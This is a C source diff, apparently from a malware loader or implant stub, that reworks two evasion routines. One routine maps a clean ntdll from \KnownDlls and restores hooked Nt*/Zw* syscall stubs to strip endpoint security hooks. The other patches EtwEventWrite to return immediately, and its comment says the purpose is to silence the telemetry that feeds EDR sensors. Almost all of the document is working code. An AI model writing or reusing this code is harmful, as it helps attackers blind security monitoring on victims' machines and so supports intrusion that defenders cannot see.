@@ -539,8 +539,21 @@ typedef struct {
 #define OBJ_CASE_INSENSITIVE 0x00000040
 
 static void _unhook_ntdll(BYTE *ntdll_base, RESOLVED_APIS *api) {
-    /* Resolve ntdll-only APIs — _resolve_export is safe for ntdll
-     * (ntdll never forwards exports to other DLLs) */
+    /*
+     * TARGETED per-stub ntdll unhooking via \KnownDlls.
+     *
+     * Maps a clean ntdll from the kernel's \KnownDlls section object,
+     * walks its export table, and only restores individual Nt*/Zw*
+     * syscall stubs that have been hooked (first bytes differ).
+     *
+     * Does NOT replace the entire .text section — that would revert
+     * Windows in-memory hotfixes and break WinHTTP networking.
+     *
+     * Uses only ntdll-native APIs — zero kernel32/kernelbase dependency,
+     * so the forwarded-export problem does not apply.
+     */
+
+    /* Resolve ntdll APIs for KnownDlls mapping */
     fnNtOpenSection_t pNtOpenSection =
         (fnNtOpenSection_t)_resolve_export(ntdll_base, H_NtOpenSection);
     fnNtMapViewOfSection_t pNtMapViewOfSection =
@@ -551,110 +564,137 @@ static void _unhook_ntdll(BYTE *ntdll_base, RESOLVED_APIS *api) {
         (fnNtClose_t)_resolve_export(ntdll_base, H_NtClose);
 
     if (!pNtOpenSection || !pNtMapViewOfSection ||
-        !pNtUnmapViewOfSection || !pNtClose ||
-        !api->pNtProtectVirtualMemory) {
-        SLOG("[stub] unhook: missing ntdll APIs — skipped");
+        !pNtUnmapViewOfSection || !pNtClose) {
+        SLOG("[stub] unhook: failed to resolve ntdll mapping APIs");
         return;
     }
 
-    /* Open \KnownDlls\ntdll.dll section object.
-     * The kernel pre-creates these at boot — no file I/O needed. */
-    WCHAR secName[] = L"\\KnownDlls\\ntdll.dll";
-    UHOOK_UNICODE_STRING uStr;
-    uStr.Length        = sizeof(secName) - sizeof(WCHAR);
-    uStr.MaximumLength = sizeof(secName);
-    uStr.Buffer        = secName;
+    /* Open \KnownDlls\ntdll.dll section object */
+    wchar_t kdName[] = L"\\KnownDlls\\ntdll.dll";
+    UHOOK_UNICODE_STRING us;
+    us.Buffer        = kdName;
+    us.Length         = (USHORT)(sizeof(kdName) - sizeof(wchar_t));
+    us.MaximumLength = (USHORT)sizeof(kdName);
 
     UHOOK_OBJECT_ATTRIBUTES oa;
-    /* Zero without memset (no CRT) */
-    {
-        BYTE *p = (BYTE *)&oa;
-        for (unsigned i = 0; i < sizeof(oa); i++) p[i] = 0;
-    }
-    oa.Length     = sizeof(oa);
-    oa.ObjectName = &uStr;
-    oa.Attributes = OBJ_CASE_INSENSITIVE;
+    oa.Length                   = sizeof(oa);
+    oa.RootDirectory            = NULL;
+    oa.ObjectName               = &us;
+    oa.Attributes               = OBJ_CASE_INSENSITIVE;
+    oa.SecurityDescriptor       = NULL;
+    oa.SecurityQualityOfService = NULL;
 
     HANDLE hSection = NULL;
-    NTSTATUS status = pNtOpenSection(&hSection, 0x4 /*SECTION_MAP_READ*/, &oa);
-    if (!NT_SUCCESS(status)) {
+    NTSTATUS st = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
+    if (st != 0 || !hSection) {
         SLOG("[stub] unhook: NtOpenSection failed");
         return;
     }
 
-    /* Map the KnownDlls section — gives us a clean IMAGE-layout copy.
-     * ViewShare (1) so it doesn't affect the original loaded mapping. */
-    PVOID cleanBase = NULL;
+    /* Map the clean ntdll into our address space */
+    PVOID pClean   = NULL;
     SIZE_T viewSize = 0;
-    status = pNtMapViewOfSection(hSection, (HANDLE)-1, &cleanBase,
-                                  0, 0, NULL, &viewSize,
-                                  1 /*ViewShare*/, 0, PAGE_READONLY);
-    if (!NT_SUCCESS(status)) {
+    st = pNtMapViewOfSection(hSection, (HANDLE)(LONG_PTR)-1,
+                              &pClean, 0, 0, NULL, &viewSize,
+                              1 /*ViewShare*/, 0, PAGE_READONLY);
+    if (st != 0 || !pClean) {
         pNtClose(hSection);
         SLOG("[stub] unhook: NtMapViewOfSection failed");
         return;
     }
 
-    /* Validate clean copy PE signature */
-    BYTE *cleanNtdll = (BYTE *)cleanBase;
-    IMAGE_DOS_HEADER *cleanDos = (IMAGE_DOS_HEADER *)cleanNtdll;
-    if (cleanDos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
-    IMAGE_NT_HEADERS *cleanNt = (IMAGE_NT_HEADERS *)(cleanNtdll + cleanDos->e_lfanew);
-    if (cleanNt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;
+    SLOG("[stub] unhook: clean ntdll mapped from KnownDlls");
 
-    /* Patch targeted Nt* stubs */
-    {
-        static const DWORD targets[] = {
-            H_NtAllocateVirtualMemory,
-            H_NtProtectVirtualMemory,
-            H_NtFreeVirtualMemory,
-            H_NtWriteVirtualMemory,
-            H_NtCreateThreadEx,
-            H_NtMapViewOfSection,
-            H_NtOpenProcess,
-            H_NtQueueApcThread,
-            H_NtReadVirtualMemory,
-            H_NtResumeThread,
-            H_NtCreateSection,
-            H_NtOpenThread,
-            H_NtUnmapViewOfSection,
-        };
-        DWORD patched = 0;
+    /* Parse the CLEAN ntdll's export directory */
+    IMAGE_DOS_HEADER *dosClean = (IMAGE_DOS_HEADER *)pClean;
+    IMAGE_NT_HEADERS *ntClean  = (IMAGE_NT_HEADERS *)
+        ((BYTE *)pClean + dosClean->e_lfanew);
 
-        for (DWORD t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
-            /* Resolve loaded (potentially hooked) address */
-            BYTE *hooked = (BYTE *)_resolve_export(ntdll_base, targets[t]);
-            if (!hooked) continue;
+    IMAGE_DATA_DIRECTORY *expDir = &ntClean->OptionalHeader
+        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-            /* KnownDlls is IMAGE-layout → same RVA offset works directly */
-            DWORD rva = (DWORD)(hooked - ntdll_base);
-            BYTE *clean = cleanNtdll + rva;
-
-            /* Check if the stub is actually hooked (first byte != 0x4C means
-             * the normal mov r10,rcx was overwritten with a JMP/etc.) */
-            if (hooked[0] == 0x4C) continue;  /* not hooked, skip */
-
-            /* Patch: make writable, copy clean stub, restore */
-            ULONG oldProt;
-            PVOID patchAddr = (PVOID)hooked;
-            SIZE_T patchSize = STUB_PATCH_SIZE;
-            api->pNtProtectVirtualMemory((HANDLE)-1, &patchAddr, &patchSize,
-                                         PAGE_EXECUTE_READWRITE, &oldProt);
-            for (int b = 0; b < STUB_PATCH_SIZE; b++)
-                hooked[b] = clean[b];
-            patchAddr = (PVOID)hooked;
-            patchSize = STUB_PATCH_SIZE;
-            api->pNtProtectVirtualMemory((HANDLE)-1, &patchAddr, &patchSize,
-                                         oldProt, &oldProt);
-            patched++;
-        }
-
-        SHEX("[stub] unhook: stubs patched", patched);
+    if (!expDir->VirtualAddress || !expDir->Size) {
+        pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
+        pNtClose(hSection);
+        SLOG("[stub] unhook: no export directory in clean ntdll");
+        return;
     }
 
-cleanup:
-    pNtUnmapViewOfSection((HANDLE)-1, cleanBase);
+    DWORD exportRVA  = expDir->VirtualAddress;
+    DWORD exportSize = expDir->Size;
+
+    IMAGE_EXPORT_DIRECTORY *pExports = (IMAGE_EXPORT_DIRECTORY *)
+        ((BYTE *)pClean + exportRVA);
+
+    DWORD *nameRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfNames);
+    WORD  *ordinals = (WORD  *)((BYTE *)pClean + pExports->AddressOfNameOrdinals);
+    DWORD *funcRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfFunctions);
+
+    DWORD stubsRestored = 0;
+    DWORD i;
+
+    /* Walk every named export, restore only hooked syscall stubs */
+    for (i = 0; i < pExports->NumberOfNames; i++) {
+        const char *name = (const char *)((BYTE *)pClean + nameRVAs[i]);
+
+        /* Only Nt* and Zw* exports are syscall stubs */
+        if (!((name[0] == 'N' && name[1] == 't') ||
+              (name[0] == 'Z' && name[1] == 'w')))
+            continue;
+
+        /* Skip NtdllDefWindowProc_ etc. — not syscall stubs */
+        if (name[0] == 'N' && name[1] == 't' && name[2] == 'd')
+            continue;
+
+        DWORD funcRVA = funcRVAs[ordinals[i]];
+
+        /* Skip forwarded exports (RVA within export directory) */
+        if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize)
+            continue;
+
+        BYTE *pCleanFunc  = (BYTE *)pClean     + funcRVA;
+        BYTE *pLoadedFunc = ntdll_base         + funcRVA;
+
+        /* Verify syscall stub: clean starts with mov r10, rcx (4C 8B D1) */
+        if (pCleanFunc[0] != 0x4C || pCleanFunc[1] != 0x8B || pCleanFunc[2] != 0xD1)
+            continue;
+
+        /* Compare first STUB_PATCH_SIZE bytes (no CRT — manual loop) */
+        {
+            int differs = 0;
+            int j;
+            for (j = 0; j < STUB_PATCH_SIZE; j++) {
+                if (pLoadedFunc[j] != pCleanFunc[j]) { differs = 1; break; }
+            }
+            if (!differs) continue;
+        }
+
+        /* Hooked — restore via NtProtectVirtualMemory (no kernel32) */
+        {
+            PVOID pBase  = pLoadedFunc;
+            SIZE_T pSize = STUB_PATCH_SIZE;
+            ULONG oldProt;
+            int j;
+
+            st = api->pNtProtectVirtualMemory(
+                     (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
+                     PAGE_EXECUTE_READWRITE, &oldProt);
+            if (st == 0) {
+                for (j = 0; j < STUB_PATCH_SIZE; j++)
+                    pLoadedFunc[j] = pCleanFunc[j];
+                api->pNtProtectVirtualMemory(
+                    (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
+                    oldProt, &oldProt);
+                stubsRestored++;
+            }
+        }
+    }
+
+    pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
     pNtClose(hSection);
+
+    SLOG(stubsRestored ? "[stub] unhook: syscall stubs restored"
+                       : "[stub] unhook: no hooks detected");
 }
 
 
@@ -671,35 +711,43 @@ cleanup:
  * ═══════════════════════════════════════════════════════════════════ */
 
 static void _patch_etw(BYTE *ntdll_base, RESOLVED_APIS *api) {
-    /* Find EtwEventWrite in ntdll exports.
-     * EtwEventWrite is a native ntdll export (NOT forwarded), so
-     * _resolve_export is safe here. */
-    BYTE *pEtwEventWrite = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
-    if (!pEtwEventWrite) {
+    /*
+     * Patch EtwEventWrite to immediately return STATUS_SUCCESS.
+     * Silences the ETW telemetry pipeline that feeds EDR sensors.
+     *
+     * x64 patch: xor rax, rax; ret  →  48 33 C0 C3
+     *
+     * Uses NtProtectVirtualMemory — zero kernel32 dependency.
+     */
+    BYTE *pFunc = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
+    if (!pFunc) {
         SLOG("[stub] etw: EtwEventWrite not found");
         return;
     }
 
-    if (!api->pNtProtectVirtualMemory) return;
+    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };   /* xor rax, rax; ret */
 
-    /* Make writable — use NtProtectVirtualMemory (ntdll) directly,
-     * NOT kernel32 VirtualProtect which may be a forwarded export. */
-    ULONG oldProtect;
-    PVOID etwAddr = (PVOID)pEtwEventWrite;
-    SIZE_T etwSize = 4;
-    api->pNtProtectVirtualMemory((HANDLE)-1, &etwAddr, &etwSize,
-                                  PAGE_EXECUTE_READWRITE, &oldProtect);
+    PVOID pBase  = pFunc;
+    SIZE_T pSize = sizeof(patch);
+    ULONG oldProt;
 
-    /* Patch: xor eax, eax (0x33 0xC0) ; ret (0xC3) */
-    pEtwEventWrite[0] = 0x33;  /* xor eax, eax */
-    pEtwEventWrite[1] = 0xC0;
-    pEtwEventWrite[2] = 0xC3;  /* ret */
+    NTSTATUS st = api->pNtProtectVirtualMemory(
+                      (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
+                      PAGE_EXECUTE_READWRITE, &oldProt);
+    if (st != 0) {
+        SLOG("[stub] etw: VirtualProtect failed");
+        return;
+    }
 
-    /* Restore protection */
-    etwAddr = (PVOID)pEtwEventWrite;
-    etwSize = 4;
-    api->pNtProtectVirtualMemory((HANDLE)-1, &etwAddr, &etwSize,
-                                  oldProtect, &oldProtect);
+    /* Manual byte copy (no CRT) */
+    pFunc[0] = patch[0];
+    pFunc[1] = patch[1];
+    pFunc[2] = patch[2];
+    pFunc[3] = patch[3];
+
+    api->pNtProtectVirtualMemory(
+        (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
+        oldProt, &oldProt);
 
     SLOG("[stub] etw: EtwEventWrite patched");
 }
